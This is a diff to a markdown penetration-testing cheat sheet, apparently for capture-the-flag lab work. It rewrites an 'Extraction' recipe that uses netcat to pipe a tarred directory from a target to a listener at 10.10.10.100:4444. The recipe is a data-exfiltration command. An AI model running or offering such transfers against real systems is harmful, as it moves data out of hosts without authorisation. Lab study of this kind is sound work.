@@ -266,14 +266,14 @@ chmod +x linpeas.sh
 
 # Extraction
 ## Send directory with `netcat`
+### Receiver:
+```bash
+nc -lvp 4444 > directory.tar.gz
+```
 ### Sender:
 ```bash
 tar -czf directory.tar.gz ./directory
-cat directory.tar.gz | nc box.htb 1234
-```
-### Receiver:
-```bash
-nc -l -p 1234 > directory.tar.gz
+cat directory.tar.gz | nc 10.10.10.100 4444
 ```
 
 ## Archive manipulation with `tar`
